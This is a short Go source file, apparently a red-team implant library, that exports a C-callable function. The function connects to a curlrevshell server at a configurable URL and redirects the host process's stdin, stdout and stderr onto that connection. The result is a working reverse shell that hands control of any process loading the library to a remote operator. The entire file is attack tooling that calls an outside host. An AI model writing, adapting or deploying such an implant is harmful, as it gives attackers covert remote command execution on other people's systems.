// Library horizontal_aubergine - Hook up a process's stdio to curlrevshell
package main

/*
 * horizontal_aubergine.go
 * Hook up a process's stdio to curlrevshell
 * By J. Stuart McMurray
 * Created 20250906
 * Last Modified 20251102
 */

import (
	"C"
	"context"
	"log"
	"os"
	"syscall"

	"github.com/magisterquis/curlrevshell/lib/crsdialer"
)

var (
	Fingerprint string
	URL         string
)

//export connect_stdio
func connect_stdio() {
	/* Connect to curlrevshell. */
	c, err := crsdialer.Dial(context.Background(), URL, Fingerprint)
	if nil != err {
		log.Printf("Error connecting to server: %s", err)
		return
	}
	defer c.Close()
	f, err := c.File()
	if nil != err {
		log.Printf("Error getting connection as a file: %s", err)
		return
	}
	fd := int(f.Fd())

	/* Hook up stdio. */
	if err := syscall.Dup2(fd, int(os.Stdin.Fd())); nil != err {
		log.Printf("Error hooking up stdin: %s", err)
	} else if err := syscall.Dup2(fd, int(os.Stdout.Fd())); nil != err {
		log.Printf("Error hooking up stdout: %s", err)
	} else if err := syscall.Dup2(fd, int(os.Stderr.Fd())); nil != err {
		log.Printf("Error hooking up stderr: %s", err)
	}
}

func main() {}
